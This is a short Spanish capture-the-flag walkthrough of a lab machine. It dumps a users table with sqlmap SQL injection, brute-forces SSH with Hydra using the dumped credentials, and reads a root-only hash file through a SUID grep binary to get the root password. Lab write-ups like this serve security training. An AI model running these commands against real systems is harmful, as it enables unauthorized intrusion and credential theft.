## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Dentro hay un panel de login, paso directamente a la inyección SQL con Sqlmap interceptando la petición:

```bash
sqlmap -r request.txt --dbs --batch
```

Hay una base de datos llamada users.

```bash
sqlmap -r request.txt --batch -D users --threads 10 --tables
```

Encuentro la tabla usuarios:

```bash
sqlmap -r request.txt --batch -D users -T usuarios --threads 10 --dump
```

Hay tres posibles usuarios y tres posibles contraseñas. Creo un archivo para cada una y lanzo un ataque con Hydra:

Users.txt

```bash
paco
pepe
juan
```

Pass.txt

```bash
$paco$123
P123pepe3456P
jjuuaann123
```

```bash
hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 64
```

User : pepe

Pass : P123pepe3456P

## Escalada

Listo permisos SUID:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
# Info:
/usr/bin/grep
/usr/bin/ls
```

Interesan esos dos.

Haciendo un listado del directorio /root encuentro:

```bash
ls -la /root
# Info:
pass.hash
```

Lo puedo leer de la siguiente forma:

```bash
LFILE=/root/pass.hash
grep '' $LFILE
# e43833c4c9d5ac444e16bb94715a75e4
```

Decodificado es:

```bash
spongebob34
```

Es la contraseña de root.

Listo.
